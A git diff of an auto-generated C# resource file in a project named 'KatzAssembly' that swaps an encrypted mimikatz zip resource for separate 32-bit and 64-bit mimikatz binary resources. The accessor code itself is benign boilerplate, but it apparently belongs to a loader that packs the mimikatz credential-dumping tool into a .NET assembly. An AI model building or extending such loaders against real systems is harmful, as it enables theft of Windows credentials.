@@ -63,9 +63,19 @@ namespace KatzAssembly.Properties {
         /// <summary>
         ///   Поиск локализованного ресурса типа System.Byte[].
         /// </summary>
-        internal static byte[] mimikatz_trunk_zip_enc {
+        internal static byte[] Win32mimikatz {
             get {
-                object obj = ResourceManager.GetObject("mimikatz_trunk_zip_enc", resourceCulture);
+                object obj = ResourceManager.GetObject("Win32mimikatz", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Поиск локализованного ресурса типа System.Byte[].
+        /// </summary>
+        internal static byte[] x64mimikatz {
+            get {
+                object obj = ResourceManager.GetObject("x64mimikatz", resourceCulture);
                 return ((byte[])(obj));
             }
         }
